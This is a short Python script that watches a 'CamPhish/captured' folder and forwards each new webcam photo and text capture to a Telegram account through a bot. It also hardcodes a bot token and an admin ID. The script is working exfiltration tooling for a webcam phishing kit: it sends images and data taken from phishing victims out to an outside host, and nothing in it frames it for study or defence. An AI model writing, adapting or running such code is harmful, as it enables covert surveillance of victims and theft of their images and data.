import os
import time
import telebot

BOT_TOKEN = '8097391238:AAHAkrpHBa0vnj0hH30C6arz8GkKMW5l7H8'
ADMIN_ID = 7967749703
bot = telebot.TeleBot(BOT_TOKEN)

CAPTURE_DIR = 'CamPhish/captured'
sent_files = set()

def check_and_send():
    global sent_files
    for file in os.listdir(CAPTURE_DIR):
        path = os.path.join(CAPTURE_DIR, file)
        if file not in sent_files and os.path.isfile(path):
            try:
                if file.endswith('.jpg'):
                    bot.send_photo(ADMIN_ID, photo=open(path, 'rb'), caption="📸 New cam capture detected")
                elif file.endswith('.txt'):
                    bot.send_document(ADMIN_ID, open(path, 'rb'))
                sent_files.add(file)
                print(f"📤 Sent: {file}")
            except Exception as e:
                print(f"❌ Error sending {file}: {e}")

print("📡 Watching for new CamPhish captures...")
while True:
    check_and_send()
    time.sleep(5)
